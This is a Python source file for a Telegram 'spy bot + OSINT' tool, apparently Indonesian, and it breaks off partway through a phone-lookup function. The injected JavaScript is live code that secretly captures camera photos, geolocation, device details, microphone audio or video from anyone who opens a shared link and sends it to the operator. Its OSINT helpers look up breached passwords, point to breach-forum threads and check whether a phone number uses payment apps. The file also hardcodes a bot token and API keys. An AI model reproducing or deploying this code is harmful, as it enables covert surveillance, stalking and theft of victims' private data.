#!/usr/bin/env python3
# lang: Python 3, file: say_bot_osint.py, target: Termux / Linux
# jalankan: python say_bot_osint.py
# dep: pip install flask requests python-telegram-bot imagehash Pillow stem

import os, sys, base64, datetime, threading, time
import subprocess, shutil, socket, re, signal, asyncio, json, random, string
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

try:
    from flask import Flask, request as freq, jsonify
except ImportError:
    print("[!] pip install flask"); sys.exit(1)
try:
    import requests as req_lib
except ImportError:
    print("[!] pip install requests"); sys.exit(1)
try:
    from telegram import (Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup,
                           ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove)
    from telegram.ext import (Application, CommandHandler, CallbackQueryHandler,
                               MessageHandler, ContextTypes, filters)
except ImportError:
    print("[!] pip install python-telegram-bot"); sys.exit(1)
try:
    from pyngrok import ngrok as _ngrok; PYNGROK = True
except ImportError:
    PYNGROK = False
try:
    from PIL import Image
    import imagehash
    PHASH_OK = True
except ImportError:
    PHASH_OK = False
try:
    from stem import Signal
    from stem.control import Controller
    TOR_OK = True
except ImportError:
    TOR_OK = False

from bocor import run_bocor

# ================================================================== #
#  KONFIGURASI
# ================================================================== #
BOT_TOKEN  = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
ADMIN_ID   = "8598136412"
GROUP_ID   = "-5591690895"
DATA_FILE  = "data.json"
FREE_LIMIT = 3

RAPIDAPI_KEY  = "227f756b50mshbfbd6f18ab7cf41p17b064jsn0ade51590aae"
LEAKCHECK_KEY = "99aed655fc285391368f32a9d1bb6d67c01a0a18"

LEAKLOOKUP_KEY  = ""
ABSTRACTAPI_KEY = ""

PREMIUM_DURATIONS = {
    "1d":  ("1 Hari",    1),
    "1w":  ("1 Minggu",  7),
    "2w":  ("2 Minggu",  14),
    "3w":  ("3 Minggu",  21),
    "1m":  ("1 Bulan",   30),
    "perm":("Permanent", None),
}

# ================================================================== #
#  OSINT — SITES LIST (500 situs)
# ================================================================== #
SITES_TEXT = """
tiktok https://www.tiktok.com/@{u}
instagram https://www.instagram.com/{u}/
x https://x.com/{u}
facebook https://www.facebook.com/{u}
threads https://www.threads.net/@{u}
snapchat https://www.snapchat.com/add/{u}
pinterest https://www.pinterest.com/{u}/
reddit https://www.reddit.com/user/{u}
tumblr https://{u}.tumblr.com
linkedin https://www.linkedin.com/in/{u}
vk https://vk.com/{u}
telegram https://t.me/{u}
mastodon https://mastodon.social/@{u}
bluesky https://bsky.app/profile/{u}.bsky.social
quora https://www.quora.com/profile/{u}
flickr https://www.flickr.com/people/{u}
myspace https://myspace.com/{u}
medium https://medium.com/@{u}
substack https://{u}.substack.com
wordpress https://{u}.wordpress.com
blogspot https://{u}.blogspot.com
aboutme https://about.me/{u}
linktree https://linktr.ee/{u}
carrd https://{u}.carrd.co
biolink https://bio.link/{u}
beacons https://beacons.ai/{u}
kofi https://ko-fi.com/{u}
patreon https://www.patreon.com/{u}
buymeacoffee https://www.buymeacoffee.com/{u}
gumroad https://{u}.gumroad.com
github https://github.com/{u}
gitlab https://gitlab.com/{u}
bitbucket https://bitbucket.org/{u}/
codepen https://codepen.io/{u}
replit https://replit.com/@{u}
hackerone https://hackerone.com/{u}
devto https://dev.to/{u}
hashnode https://hashnode.com/@{u}
npm https://www.npmjs.com/~{u}
pypi https://pypi.org/user/{u}/
dockerhub https://hub.docker.com/u/{u}
kaggle https://www.kaggle.com/{u}
leetcode https://leetcode.com/{u}/
codeforces https://codeforces.com/profile/{u}
hackerrank https://www.hackerrank.com/{u}
codewars https://www.codewars.com/users/{u}
sourceforge https://sourceforge.net/u/{u}/profile
gitee https://gitee.com/{u}
huggingface https://huggingface.co/{u}
roblox https://www.roblox.com/user.aspx?username={u}
steam https://steamcommunity.com/id/{u}
twitch https://www.twitch.tv/{u}
chesscom https://www.chess.com/member/{u}
lichess https://lichess.org/@/{u}
namemc https://namemc.com/profile/{u}
itchio https://{u}.itch.io
gamejolt https://gamejolt.com/@{u}
speedrun https://www.speedrun.com/users/{u}
osu https://osu.ppy.sh/users/{u}
trakt https://trakt.tv/users/{u}
myanimelist https://myanimelist.net/profile/{u}
anilist https://anilist.co/user/{u}
bandcamp https://{u}.bandcamp.com
soundcloud https://soundcloud.com/{u}
spotify https://open.spotify.com/user/{u}
lastfm https://www.last.fm/user/{u}
mixcloud https://www.mixcloud.com/{u}/
audiomack https://audiomack.com/{u}
genius https://genius.com/{u}
discogs https://www.discogs.com/user/{u}
youtube https://www.youtube.com/@{u}
vimeo https://vimeo.com/{u}
dailymotion https://www.dailymotion.com/{u}
rumble https://rumble.com/user/{u}
odysee https://odysee.com/@{u}
kick https://kick.com/{u}
deviantart https://www.deviantart.com/{u}
behance https://www.behance.net/{u}
dribbble https://dribbble.com/{u}
artstation https://www.artstation.com/{u}
500px https://500px.com/p/{u}
unsplash https://unsplash.com/@{u}
imgur https://imgur.com/user/{u}
fiverr https://www.fiverr.com/{u}
freelancer https://www.freelancer.com/u/{u}
wattpad https://www.wattpad.com/user/{u}
letterboxd https://letterboxd.com/{u}/
ebay https://www.ebay.com/usr/{u}
etsy https://www.etsy.com/shop/{u}
tokopedia https://www.tokopedia.com/{u}
shopee https://shopee.co.id/{u}
bukalapak https://www.bukalapak.com/u/{u}
kaskus https://www.kaskus.co.id/@{u}
kompasiana https://www.kompasiana.com/{u}
trakteer https://trakteer.id/{u}
saweria https://saweria.co/{u}
sociabuzz https://sociabuzz.com/{u}
likee https://likee.video/@{u}
hackernews https://news.ycombinator.com/user?id={u}
producthunt https://www.producthunt.com/@{u}
disqus https://disqus.com/by/{u}/
gravatar https://gravatar.com/{u}
keybase https://keybase.io/{u}
pastebin https://pastebin.com/u/{u}
slideshare https://www.slideshare.net/{u}
scribd https://www.scribd.com/{u}
instructables https://www.instructables.com/member/{u}/
hackaday https://hackaday.io/{u}
thingiverse https://www.thingiverse.com/{u}
sketchfab https://sketchfab.com/{u}
vsco https://vsco.co/{u}
ifunny https://ifunny.co/user/{u}
9gag https://9gag.com/u/{u}
askfm https://ask.fm/{u}
tellonym https://tellonym.me/{u}
stocktwits https://stocktwits.com/{u}
tradingview https://www.tradingview.com/u/{u}/
opensea https://opensea.io/{u}
hackerearth https://www.hackerearth.com/@{u}
topcoder https://www.topcoder.com/members/{u}
codechef https://www.codechef.com/users/{u}
devpost https://devpost.com/{u}
figma https://www.figma.com/@{u}
indiehackers https://www.indiehackers.com/{u}
scratch https://scratch.mit.edu/users/{u}/
myfitnesspal https://www.myfitnesspal.com/profile/{u}
tinder https://tinder.com/@{u}
xing https://www.xing.com/profile/{u}
gettr https://gettr.com/user/{u}
minds https://www.minds.com/{u}
gab https://gab.com/{u}
musescore https://musescore.com/{u}
bandlab https://www.bandlab.com/{u}
codeberg https://codeberg.org/{u}
crunchbase https://www.crunchbase.com/person/{u}
steemit https://steemit.com/@{u}
rarible https://rarible.com/{u}
etoro https://www.etoro.com/people/{u}
duolingo https://www.duolingo.com/profile/{u}
tripadvisor https://www.tripadvisor.com/Profile/{u}
untappd https://untappd.com/user/{u}
archiveorg https://archive.org/details/@{u}
openstreetmap https://www.openstreetmap.org/user/{u}
goodreads https://www.goodreads.com/{u}
kumparan https://kumparan.com/{u}
karyakarsa https://karyakarsa.com/{u}
bugcrowd https://bugcrowd.com/{u}
tryhackme https://tryhackme.com/p/{u}
rootme https://www.root-me.org/{u}
"""

NOT_FOUND = {
    "tiktok":    ["Couldn't find this account", "couldn\\u2019t find this account"],
    "instagram": ["Page Not Found", "isn't available", "accounts/login"],
    "x":         ["This account doesn", "doesn\\u2019t exist"],
    "facebook":  ["This content isn't available", "Page Not Found"],
    "reddit":    ["Sorry, nobody on Reddit goes by that name", "page not found"],
    "twitch":    ["Sorry. Unless you've got a time machine"],
    "telegram":  ["tgme_page_extra\"></div>"],
    "roblox":    ["Page cannot be found", "Page not found"],
    "linktree":  ["The page you\u2019re looking for doesn", "doesn't exist"],
}
GENERIC_NOT_FOUND = [
    "page not found", "user not found", "profile not found", "account not found",
    "doesn't exist", "does not exist", "no such user", "couldn't find",
    "halaman tidak ditemukan", "pengguna tidak ditemukan",
]
PRIORITY_SITES = ["instagram","facebook","tiktok","x","threads","telegram","github","linkedin"]
INDONESIAN_SITES = ["tokopedia","shopee","bukalapak","kaskus","kompasiana","trakteer","saweria","sociabuzz"]
BREACH_LINKS = {
    "tokopedia": "https://breachforums.st/Thread-Tokopedia",
    "adobe":     "https://breachforums.st/Thread-Adobe",
    "linkedin":  "https://breachforums.st/Thread-LinkedIn",
    "bukalapak": "https://breachforums.st/Thread-Bukalapak",
}
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

# ================================================================== #
#  BANNER
# ================================================================== #
RESET = "\033[0m"; BOLD = "\033[1m"
COLORS = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]
ASCII_ART = [
    " __  __ ____  _  _  _  _   _   _       ___ ____  ",
    "|  \\/  |  _ \\| || || || | | | | |     |_ _|  _ \\ ",
    "| |\\/| | |_) | || || || |_| |_| |      | || | | |",
    "| |  | |  _ <|__  _  __|  _  _  |      | || |_| |",
    "|_|  |_|_| \\_\\  |_| |_|  |_| |_|     |___|____/ ",
]
TUTORIAL_TEXT = """📖 *TUTORIAL SPY BOT BY LANOX*

━━━━━━━━━━━━━━━━━━━━
*1️⃣ MULAI*
Ketik /start untuk membuka panel utama.

*2️⃣ TAMBAH LINK*
➕ Tambah Link → pilih template Clone URL atau File HTML.

*3️⃣ PILIH MODE SADAP*
📷 Kamera + Lokasi
🎤 Kamera + Lokasi + Mic
🎥 Video + Lokasi

*4️⃣ SHARE KE TARGET*
Salin link → kirim ke target.
Data masuk otomatis ke chat kamu.

*5️⃣ OSINT TOOLS*
Tekan tombol 🔍 OSINT Tools di panel utama.
Fitur tersedia:
• Username Finder (500+ situs)
• Breach Check (HIBP + BD + LC)
• Cek Data Bocor (Email/Username/HP/NIK/Password)
• Phone Lookup (WA, TG, fintech)
• Profile Scraper
• Google Dorking
• Wayback Check
• NIK Search
• BPJS Search
• Full OSINT

🔥 *SPY BOT + OSINT BY LANOX*"""

def print_banner():
    os.system("clear")
    print()
    for i, line in enumerate(ASCII_ART):
        print(f"{BOLD}{COLORS[i % len(COLORS)]}{line}{RESET}")
    print(f"\n  \033[90mbot spy + osint by MR414N-ID\033[0m\n")

# ================================================================== #
#  TIMER
# ================================================================== #
_start_time = time.time(); _timer_running = True

def format_uptime():
    e = int(time.time() - _start_time)
    return f"{e//3600:02d}:{(e%3600)//60:02d}:{e%60:02d}"

def timer_thread():
    while _timer_running:
        sys.stdout.write(f"\r  \033[90m⏱  Server aktif: \033[97m{format_uptime()}\033[0m   ")
        sys.stdout.flush(); time.sleep(1)

# ================================================================== #
#  DATABASE
# ================================================================== #
_db_lock = threading.Lock()

def db_default():
    return {"users": {}, "admins": [ADMIN_ID], "banned": []}

def db_read() -> dict:
    if not os.path.isfile(DATA_FILE):
        return db_default()
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return db_default()

def db_write(data: dict):
    tmp = DATA_FILE + ".tmp"
    with _db_lock:
        try:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            os.replace(tmp, DATA_FILE)
        except Exception as e:
            print(f"\n[!] db_write error: {e}")

def db_ensure_user(uid: str) -> bool:
    data = db_read()
    if uid not in data["users"]:
        role = "admin" if uid in data.get("admins", []) else "free"
        data["users"][uid] = {"role": role, "cap_total": 0,
                               "joined": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
                               "premium_until": None}
        db_write(data); return True
    return False

def db_get_role(uid: str) -> str:
    data = db_read()
    if uid in data.get("admins", []): return "admin"
    u = data["users"].get(uid, {})
    role = u.get("role", "free")
    if role == "premium":
        until = u.get("premium_until")
        if until:
            exp = datetime.datetime.strptime(until, "%Y-%m-%d")
            if datetime.datetime.now() > exp:
                db_set_role(uid, "free"); return "free"
    return role

def db_set_role(uid, role, until=None):
    data = db_read()
    if uid in data["users"]:
        data["users"][uid]["role"] = role
        data["users"][uid]["premium_until"] = until
        db_write(data)

def db_ban(uid):
    data = db_read()
    if uid not in data.get("banned", []):
        data.setdefault("banned", []).append(uid); db_write(data)

def db_unban(uid):
    data = db_read()
    if uid in data.get("banned", []):
        data["banned"].remove(uid); db_write(data)

def db_is_banned(uid): return uid in db_read().get("banned", [])

def db_add_admin(uid):
    data = db_read()
    if uid not in data.get("admins", []):
        data.setdefault("admins", []).append(uid)
        if uid in data["users"]: data["users"][uid]["role"] = "admin"
        db_write(data)

def db_remove_admin(uid):
    if uid == ADMIN_ID: return False
    data = db_read()
    if uid in data.get("admins", []):
        data["admins"].remove(uid)
        if uid in data["users"]: data["users"][uid]["role"] = "free"
        db_write(data)
    return True

def db_increment_cap(uid):
    data = db_read()
    if uid in data["users"]:
        data["users"][uid]["cap_total"] = data["users"][uid].get("cap_total", 0) + 1
        db_write(data)

def db_all_users(): return db_read().get("users", {})
def db_link_count(uid): return sum(1 for l in _links if str(l["owner"]) == uid)

def db_get_stats():
    data = db_read(); users = data.get("users", {})
    total_cap = sum(u.get("cap_total", 0) for u in users.values())
    roles = {"admin": 0, "premium": 0, "free": 0}
    for u in users.values():
        r = u.get("role", "free"); roles[r] = roles.get(r, 0) + 1
    return {"total_users": len(users), "total_links": len(_links),
            "total_cap": total_cap, "roles": roles}

# ================================================================== #
#  ACTIVE TARGETS
# ================================================================== #
_active_targets = {}

def mark_active(link_id, ip):
    if link_id not in _active_targets: _active_targets[link_id] = {}
    _active_targets[link_id][ip] = time.time()

def get_online_count():
    now = time.time()
    return sum(1 for t in _active_targets.values() for ts in t.values() if now - ts < 15)
    # ================================================================== #
#  JS INJECT
# ================================================================== #
INJECT_JS = """
<script>
(function(){
  var capCount=0, active=true;
  function snapCamera(facingMode,cb){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false})
    .then(function(stream){
      var v=document.createElement('video');
      v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play();
      var fired=false;
      function grab(){
        if(fired)return;fired=true;
        var c=document.createElement('canvas');
        c.width=v.videoWidth||640;c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        stream.getTracks().forEach(function(t){t.stop();});
        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
      }
      v.addEventListener('loadeddata',grab);
      setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
    }).catch(function(){cb(null);});
  }
  function getLocation(cb){
    if(!navigator.geolocation){cb(null,null,null);return;}
    navigator.geolocation.getCurrentPosition(
      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
      function(){cb(null,null,null);},{enableHighAccuracy:true,timeout:10000});
  }
  function getNetworkInfo(cb){
    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
    cb(info);
  }
  function getBattery(cb){
    if(!navigator.getBattery){cb(null,null);return;}
    navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});
  }
  function getPublicIP(cb){
    fetch('https://api.ipify.org?format=json',{mode:'cors'})
    .then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});
  }
  function collectInfo(cb){
    var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',
              timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
              screen:window.screen.width+'x'+window.screen.height,
              network:null,battery_pct:null,charging:null,ip:null};
    getNetworkInfo(function(net){
      info.network=net;
      getBattery(function(pct,chrg){
        info.battery_pct=pct;info.charging=chrg;
        getPublicIP(function(ip){info.ip=ip;cb(info);});
      });
    });
  }
  function doCapture(isFirst){
    if(!active)return;
    capCount++;var num=capCount;
    snapCamera('environment',function(back){
      snapCamera('user',function(front){
        var payload={num:num,photo_front:front||null,photo_back:back||null,lat:null,lon:null,acc:null,info:null};
        if(isFirst){
          getLocation(function(lat,lon,acc){
            payload.lat=lat;payload.lon=lon;payload.acc=acc;
            collectInfo(function(info){payload.info=info;send(payload);});
          });
        } else { send(payload); }
      });
    });
  }
  function send(payload){
    fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
                      body:JSON.stringify(payload)}).catch(function(){});
  }
  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);
  window.addEventListener('beforeunload',function(){active=false;navigator.sendBeacon('/offline','{}');});
  function loop(){if(!active)return;doCapture(capCount===0);setTimeout(loop,5000);}
  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',loop);}else{loop();}
})();
</script>
"""

INJECT_JS_MIC = """
<script>
(function(){
  var capCount=0,active=true,mediaRecorder=null,audioChunks=[],micStream=null;
  function initMic(cb){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb();return;}
    navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:{ideal:'environment'}}})
    .then(function(stream){
      micStream=stream;
      var audioOnly=new MediaStream(stream.getAudioTracks());
      stream.getVideoTracks().forEach(function(t){t.stop();});
      var mimeType='audio/webm';
      if(!MediaRecorder.isTypeSupported(mimeType))mimeType='audio/ogg;codecs=opus';
      if(!MediaRecorder.isTypeSupported(mimeType))mimeType='audio/ogg';
      if(!MediaRecorder.isTypeSupported(mimeType))mimeType='';
      try{
        mediaRecorder=new MediaRecorder(audioOnly,mimeType?{mimeType:mimeType}:{});
        mediaRecorder.ondataavailable=function(e){if(e.data&&e.data.size>0)audioChunks.push(e.data);};
        mediaRecorder.start();
      }catch(err){}
      cb();
    }).catch(function(){
      navigator.mediaDevices.getUserMedia({audio:true}).then(function(stream){
        micStream=stream;
        var mimeType='audio/webm';if(!MediaRecorder.isTypeSupported(mimeType))mimeType='';
        try{
          mediaRecorder=new MediaRecorder(stream,mimeType?{mimeType:mimeType}:{});
          mediaRecorder.ondataavailable=function(e){if(e.data&&e.data.size>0)audioChunks.push(e.data);};
          mediaRecorder.start();
        }catch(err){}
        cb();
      }).catch(function(){cb();});
    });
  }
  function sendAudio(){
    try{
      if(!mediaRecorder)return;
      if(mediaRecorder.state==='recording')mediaRecorder.stop();
      mediaRecorder.onstop=function(){
        if(audioChunks.length===0)return;
        var blob=new Blob(audioChunks,{type:mediaRecorder.mimeType||'audio/webm'});
        var reader=new FileReader();
        reader.onloadend=function(){
          var b64=reader.result.split(',')[1];
          navigator.sendBeacon('/audio',JSON.stringify({audio:b64,mime:mediaRecorder.mimeType||'audio/webm'}));
        };
        reader.readAsDataURL(blob);
      };
    }catch(e){}
  }
  function snapCamera(facingMode,cb){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false})
    .then(function(stream){
      var v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play();
      var fired=false;
      function grab(){if(fired)return;fired=true;var c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(function(t){t.stop();});cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);}
      v.addEventListener('loadeddata',grab);
      setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
    }).catch(function(){cb(null);});
  }
  function getLocation(cb){if(!navigator.geolocation){cb(null,null,null);return;}navigator.geolocation.getCurrentPosition(function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},function(){cb(null,null,null);},{enableHighAccuracy:true,timeout:10000});}
  function getNetworkInfo(cb){var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}cb(info);}
  function getBattery(cb){if(!navigator.getBattery){cb(null,null);return;}navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});}
  function getPublicIP(cb){fetch('https://api.ipify.org?format=json',{mode:'cors'}).then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});}
  function collectInfo(cb){var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',screen:window.screen.width+'x'+window.screen.height,network:null,battery_pct:null,charging:null,ip:null};getNetworkInfo(function(net){info.network=net;getBattery(function(pct,chrg){info.battery_pct=pct;info.charging=chrg;getPublicIP(function(ip){info.ip=ip;cb(info);});});});}
  function doCapture(isFirst){if(!active)return;capCount++;var num=capCount;snapCamera('environment',function(back){snapCamera('user',function(front){var payload={num:num,photo_front:front||null,photo_back:back||null,lat:null,lon:null,acc:null,info:null};if(isFirst){getLocation(function(lat,lon,acc){payload.lat=lat;payload.lon=lon;payload.acc=acc;collectInfo(function(info){payload.info=info;send(payload);});});}else{send(payload);}});});}
  function send(payload){fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(function(){});}
  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);
  window.addEventListener('beforeunload',function(){active=false;sendAudio();navigator.sendBeacon('/offline','{}');});
  function loop(){if(!active)return;doCapture(capCount===0);setTimeout(loop,5000);}
  function start(){initMic(function(){loop();});}
  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',start);}else{start();}
})();
</script>
"""

INJECT_JS_VIDEO = """
<script>
(function(){
  var active=true,mediaRecorder=null,videoChunks=[];
  function getLocation(cb){if(!navigator.geolocation){cb(null,null,null);return;}navigator.geolocation.getCurrentPosition(function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},function(){cb(null,null,null);},{enableHighAccuracy:true,timeout:10000});}
  function getPublicIP(cb){fetch('https://api.ipify.org?format=json',{mode:'cors'}).then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});}
  function getNetworkInfo(cb){var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}cb(info);}
  function getBattery(cb){if(!navigator.getBattery){cb(null,null);return;}navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});}
  function collectInfo(cb){var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',screen:window.screen.width+'x'+window.screen.height,network:null,battery_pct:null,charging:null,ip:null};getNetworkInfo(function(net){info.network=net;getBattery(function(pct,chrg){info.battery_pct=pct;info.charging=chrg;getPublicIP(function(ip){info.ip=ip;cb(info);});});});}
  function sendInfo(){getLocation(function(lat,lon,acc){collectInfo(function(info){fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({num:1,photo_front:null,photo_back:null,lat:lat,lon:lon,acc:acc,info:info})}).catch(function(){});});});}
  function sendVideo(){try{if(!mediaRecorder)return;if(mediaRecorder.state==='recording')mediaRecorder.stop();mediaRecorder.onstop=function(){if(videoChunks.length===0)return;var blob=new Blob(videoChunks,{type:mediaRecorder.mimeType||'video/webm'});var reader=new FileReader();reader.onloadend=function(){var b64=reader.result.split(',')[1];navigator.sendBeacon('/video',JSON.stringify({video:b64,mime:mediaRecorder.mimeType||'video/webm'}));};reader.readAsDataURL(blob);};}catch(e){}}
  function startVideo(){if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:'user'},width:{ideal:640},height:{ideal:480}},audio:true}).then(function(stream){var mimeType='video/webm;codecs=vp8,opus';if(!MediaRecorder.isTypeSupported(mimeType))mimeType='video/webm';if(!MediaRecorder.isTypeSupported(mimeType))mimeType='';try{mediaRecorder=new MediaRecorder(stream,mimeType?{mimeType:mimeType}:{});mediaRecorder.ondataavailable=function(e){if(e.data&&e.data.size>0)videoChunks.push(e.data);};mediaRecorder.start();}catch(err){}}).catch(function(){});}
  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);
  window.addEventListener('beforeunload',function(){active=false;sendVideo();navigator.sendBeacon('/offline','{}');});
  function start(){sendInfo();startVideo();}
  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',start);}else{start();}
})();
</script>
"""

RATE_LIMIT_SEC = 30

# ================================================================== #
#  STATE RUNTIME
# ================================================================== #
_links = []; _link_id_ctr = 0; _cap_counts = {}; _page_htmls = {}
_user_state = {}; _user_data = {}; _last_add = {}

# ================================================================== #
#  OSINT HELPERS
# ================================================================== #
OSINT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
}

def parse_sites():
    sites = {}
    for line in SITES_TEXT.strip().splitlines():
        line = line.strip()
        if not line: continue
        try:
            nama, url = line.split(maxsplit=1)
            sites[nama] = url.strip()
        except ValueError:
            pass
    return sites

def build_link(pola, username):
    if pola.startswith("https://{u}."): username = username.replace("_", "-")
    return pola.format(u=username)

def ada_akun(nama, pola, username):
    link = build_link(pola, username)
    try:
        r = req_lib.get(link, headers=OSINT_HEADERS, timeout=10, allow_redirects=True)
    except Exception:
        return False, link
    if r.status_code != 200: return False, link
    if nama == "instagram" and "accounts/login" in r.url: return False, link
    body = r.text[:60000].lower()
    for teks in NOT_FOUND.get(nama, []) + GENERIC_NOT_FOUND:
        if teks.lower() in body: return False, link
    return True, link

def cek_situs(nama, pola, username):
    ada, link = ada_akun(nama, pola, username)
    if not ada: return nama, link, False
    acak = "zq" + "".join(random.choices(string.ascii_lowercase + string.digits, k=14))
    ada_acak, _ = ada_akun(nama, pola, acak)
    return nama, link, not ada_acak

def osint_username_find(username):
    sites = parse_sites()
    sukses = []
    with ThreadPoolExecutor(max_workers=40) as ex:
        futures = {ex.submit(cek_situs, n, p, username): n for n, p in sites.items()}
        for f in as_completed(futures):
            try:
                nama, link, ada = f.result()
                if ada: sukses.append((nama, link))
            except Exception:
                pass
    return sorted(sukses, key=lambda x: x[0])

def osint_breach_check(email):
    hasil = []
    try:
        r = req_lib.get(
            f"https://haveibeenpwned.com/unifiedsearch/{email}",
            headers={
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
                "Referer": "https://haveibeenpwned.com/",
                "Origin": "https://haveibeenpwned.com",
            }, timeout=15)
        if r.status_code == 200:
            for b in r.json().get("Breaches", []):
                hasil.append({"nama": b.get("Name",""), "tahun": b.get("BreachDate","")[:4],
                               "data": ", ".join(b.get("DataClasses",[])), "password": None})
    except Exception:
        pass
    try:
        r = req_lib.get(
            "https://breachdirectory.p.rapidapi.com/",
            headers={"X-RapidAPI-Key": RAPIDAPI_KEY, "X-RapidAPI-Host": "breachdirectory.p.rapidapi.com"},
            params={"func": "auto", "term": email}, timeout=15)
        if r.status_code == 200:
            for item in r.json().get("result", []):
                src = item.get("sources", ["Unknown"])[0] if item.get("sources") else "Unknown"
                pw = item.get("password", "")
                match = next((h for h in hasil if h["nama"].lower() == src.lower()), None)
                if match:
                    if pw: match["password"] = pw
                else:
                    hasil.append({"nama": src, "tahun": "", "data": "password", "password": pw or None})
    except Exception:
        pass
    return hasil

def fmt_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("08"): nomor = "+62" + nomor[1:]
    elif nomor.startswith("628") and not nomor.startswith("+"): nomor = "+" + nomor
    elif not nomor.startswith("+"): nomor = "+62" + nomor
    return nomor

def cek_wa(nomor):
    no = nomor.replace("+", "")
    try:
        r = req_lib.get(f"https://wa.me/{no}", headers={"User-Agent": random.choice(UA_LIST)}, timeout=12, allow_redirects=True)
        if r and r.status_code == 200:
            if "open.whatsapp.com" in r.url or "api.whatsapp.com/send" in r.url: return True
        return False
    except Exception:
        return False

def cek_telegram_num(nomor):
    try:
        r = req_lib.get(f"https://t.me/{nomor}", headers={"User-Agent": random.choice(UA_LIST)}, timeout=10, allow_redirects=True)
        if r and r.status_code == 200 and "tgme_page_extra\"></div>" not in r.text: return True
        return False
    except Exception:
        return False

def osint_phone_lookup(nomor_raw):
    nomor = fmt_nomor(nomor_raw)
    hasil = {}
    wa = cek_wa(nomor)
    hasil["WhatsApp"] = {"ada": wa}
    tg = cek_telegram_num(nomor)
    hasil["Telegram"] = {"ada": tg}
    no_bersih = nomor.replace("+","").replace(" ","")
    no62 = no_bersih if no_bersih.startswith("62") else "62" + no_bersih.lstrip("0")
    for platform in ["OVO","GoPay","Dana","ShopeePay","LinkAja"]:
        try:
            if platform == "OVO":
                r = req_lib.get(f"https://api.ovo.id/v2/user/check-phone?phone={no62}", headers={"User-Agent": random.choice(UA_LIST)}, timeout=10)
                ada = r.status_code == 200 and "registered" in r.text.lower()
            elif platform == "GoPay":
